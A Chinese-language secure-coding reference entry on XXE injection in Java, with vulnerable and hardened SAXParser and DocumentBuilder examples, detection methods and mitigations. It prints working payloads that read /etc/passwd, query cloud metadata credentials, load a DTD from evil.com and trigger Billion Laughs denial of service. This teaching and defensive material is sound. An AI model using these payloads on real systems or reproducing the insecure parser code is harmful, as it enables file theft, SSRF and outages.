---
id: XXE
name: XML外部实体注入
severity: high
owasp: "A05:2025"
cwe: ["CWE-611"]
category: injection
frameworks: [SAXParser, DocumentBuilder, XMLReader, JAXB]
last_updated: "2026-04-18"
doc_version: "1.0"
---

# XML 外部实体注入（XXE）

> 最后更新：2026-04-18

## 概述

XML 外部实体注入（XML External Entity Injection，XXE）是一种针对解析 XML 输入的应用程序的攻击。当应用使用配置不当的 XML 解析器处理用户提供的 XML 数据时，攻击者可以通过声明外部实体来读取服务端文件、发起 SSRF 攻击、执行拒绝服务攻击，甚至在某些情况下实现远程代码执行。

在 Java 中，SAXParser、DocumentBuilder、XMLReader、JAXB 等默认配置均允许解析外部实体，是 XXE 攻击的高危入口。

## 风险等级

| 维度 | 评级 |
|------|------|
| OWASP Top 10 | A05:2025 - Injection |
| CWE | CWE-611 |
| 严重程度 | 高危 |

## 攻击类型

### 1. 文件读取

通过外部实体读取服务端本地文件内容。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
```

### 2. SSRF 攻击

通过外部实体发起服务端请求，访问内网服务或云元数据。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<user><name>&xxe;</name></user>
```

### 3. 参数实体注入

使用参数实体（`%` 声明）在不影响文档结构的情况下读取文件或发起请求。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
  %dtd;
]>
<root>content</root>
```

### 4. Billion Laughs 攻击（DoS）

利用嵌套实体实现指数级膨胀，耗尽服务端内存导致拒绝服务。

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>
```

## Java场景

### [VULNERABLE] SAXParser 默认配置解析 XML

```java
// [VULNERABLE] SAXParser 默认配置允许解析外部实体
import javax.xml.parsers.*;
import org.xml.sax.*;
import org.xml.sax.helpers.*;
import java.io.*;

public class XxeVulnerableSAX {

    // [VULNERABLE] 此方法存在 XXE 漏洞，原因：SAXParser 默认启用外部实体解析
    public void parseXml(String xmlInput) throws Exception {
        SAXParserFactory factory = SAXParserFactory.newInstance();
        // 漏洞：未禁用外部实体和 DTD，攻击者可读取文件或发起 SSRF
        SAXParser parser = factory.newSAXParser();
        parser.parse(new InputSource(new StringReader(xmlInput)), new DefaultHandler());
    }
}
```

### [VULNERABLE] DocumentBuilder 未禁用外部实体

```java
// [VULNERABLE] DocumentBuilder 直接解析用户 XML
import javax.xml.parsers.*;
import org.w3c.dom.*;
import java.io.*;

public class XxeVulnerableDOM {

    // [VULNERABLE] 此方法存在 XXE 漏洞，原因：DocumentBuilder 未安全配置
    public Document parseXml(String xmlInput) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        // 漏洞：默认配置允许外部实体和 DTD
        DocumentBuilder builder = factory.newDocumentBuilder();
        return builder.parse(new InputSource(new StringReader(xmlInput)));
    }
}
```

### [SECURE] 禁用外部实体和 DTD

```java
// [SECURE] SAXParser 安全配置，禁用外部实体和 DTD
import javax.xml.parsers.*;
import org.xml.sax.*;
import org.xml.sax.helpers.*;
import java.io.*;

public class XxeSecureSAX {

    // [SECURE] 修复了 XXE 漏洞，修复方式：禁用外部实体、DTD 和参数实体
    public void parseXml(String xmlInput) throws Exception {
        SAXParserFactory factory = SAXParserFactory.newInstance();

        // 安全配置 1：禁用 DTD
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

        // 安全配置 2：禁用外部实体（如果需要 DTD 则至少禁用外部实体）
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

        // 安全配置 3：禁用外部 DTD
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

        SAXParser parser = factory.newSAXParser();
        parser.parse(new InputSource(new StringReader(xmlInput)), new DefaultHandler());
    }
}
```

### [SECURE] DocumentBuilder 安全配置

```java
// [SECURE] DocumentBuilder 安全配置
import javax.xml.parsers.*;
import org.w3c.dom.*;
import java.io.*;

public class XxeSecureDOM {

    // [SECURE] 修复了 XXE 漏洞，修复方式：完全禁用 DTD 声明
    public Document parseXml(String xmlInput) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

        // 最佳实践：完全禁止 DOCTYPE 声明
        factory.setFeature(
            "http://apache.org/xml/features/disallow-doctype-decl", true);

        // 额外防护层
        factory.setFeature(
            "http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature(
            "http://xml.org/sax/features/external-parameter-entities", false);
        factory.setFeature(
            "http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);

        DocumentBuilder builder = factory.newDocumentBuilder();
        return builder.parse(new InputSource(new StringReader(xmlInput)));
    }
}
```

## 检测方法

1. **静态分析**：使用 Semgrep 扫描 `SAXParserFactory.newInstance()`、`DocumentBuilderFactory.newInstance()` 等调用，检查是否配置了安全 feature
2. **动态测试**：在 XML 输入中注入外部实体声明，观察服务端是否尝试解析外部实体（可使用 Burp Collaborator 检测带外请求）
3. **代码审计**：搜索所有 XML 解析相关代码，确认是否调用了 `setFeature()` 禁用外部实体
4. **依赖扫描**：检查应用使用的 XML 解析库版本，确认是否存在已知 XXE 相关漏洞

## 防护措施

1. **禁用 DTD**：最安全的做法是设置 `disallow-doctype-decl` 为 `true`，完全禁止 DOCTYPE 声明
2. **禁用外部实体**：如果必须使用 DTD，则至少禁用外部通用实体和参数实体
3. **禁用外部 DTD 加载**：设置 `load-external-dtd` 为 `false`
4. **使用 JSON 替代 XML**：如果业务允许，使用 JSON 等更安全的数据格式替代 XML
5. **WAF 防护**：在 WAF 层面拦截包含 `<!DOCTYPE` 和 `<!ENTITY` 的请求

## 参考资料

- [OWASP XXE 攻击说明](https://owasp.org/www-community/attacks/XXE)
- [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger: XXE 攻击详解](https://portswigger.net/web-security/xxe)
